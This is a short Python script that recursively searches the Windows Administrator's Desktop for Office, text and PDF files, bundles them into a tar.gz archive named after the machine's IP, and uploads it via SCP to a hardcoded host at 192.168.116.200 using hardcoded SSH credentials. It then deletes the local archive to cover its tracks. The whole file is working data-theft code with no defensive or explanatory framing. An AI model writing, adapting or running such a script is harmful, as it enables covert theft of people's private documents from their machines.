import os,paramiko,time,tarfile,easygui,threading,socket
from scp import SCPClient
def SCP(file):
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname="192.168.116.200", port=22, username='zhangsan', password="zs")
    scp=SCPClient(ssh.get_transport(),socket_timeout=15.0)
    os.chdir("C:\\Users\\Administrator\\")
    tar=tarfile.open(tarn,"w:gz")
    for i in file:
        tar.add(i)
    tar.close()
    scp.put(tarn,"~")
    os.remove(tarn)
    scp.close()
wenjian = []
def search(dir):
    global wenjian
    jiewei=['doc','docx','xls','xlsx','txt','pdf']
    os.chdir(dir)
    it = os.listdir()
    for i in it:
        pa = os.path.join(dir,i)
        if os.path.isdir(pa):
            search(pa)
            os.chdir(os.pardir)
        else:
            for i in jiewei:
                if i in pa.split("\\")[-1]:
                  wenjian.append(pa)
if __name__=="__main__":
  try:
    a=time.time()
    tarn = socket.gethostbyname(socket.gethostname()) + ".tar.gz"
    search("C:\\Users\\Administrator\\Desktop")
    threading.Thread(target=SCP,args=(wenjian,)).start()
    print("okay..........................",time.time()-a)
  except  Exception as f :
      easygui.msgbox(str(f),'linux')
